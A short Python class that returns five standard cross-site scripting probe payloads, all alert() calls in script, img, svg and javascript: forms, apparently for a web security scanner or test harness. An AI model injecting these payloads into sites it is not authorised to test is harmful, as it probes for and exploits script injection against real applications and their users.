class XSSPayloads:
    def generate(self):
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"><script>alert(1)</script>",
            "javascript:alert('XSS')",
            "<svg/onload=alert('XSS')>"
        ]